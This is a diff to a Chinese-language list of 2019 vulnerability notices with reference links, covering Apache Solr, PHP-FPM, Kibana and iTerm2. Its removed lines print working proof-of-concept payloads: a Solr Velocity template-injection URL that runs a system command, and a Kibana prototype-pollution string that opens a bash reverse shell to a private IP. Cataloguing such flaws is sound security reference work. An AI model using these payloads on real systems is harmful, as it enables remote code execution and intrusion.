@@ -11,7 +11,6 @@ share: true
 ---
 1. **【20191031】Apache Solr Velocity模版注入RCE漏洞**
     - <https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt>
-    - `/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end`
 
 1. **【20191023】PHP远程命令执行漏洞CVE-2019-11043**
     - <https://bugs.php.net/bug.php?id=78599>
@@ -20,8 +19,6 @@ share: true
 
 1. **【20191017】Kibana < 6.6.0 控制台命令执行漏洞**
     - <https://mp.weixin.qq.com/s/R4rzYDp9-q2NYAOvPK951A>
-    - PoC Part1: `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')`
-    - PoC Part2: `.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')`
 
 1. **【20191010】iTerm2存在严重漏洞可导致远程命令执行**
     - <https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/>
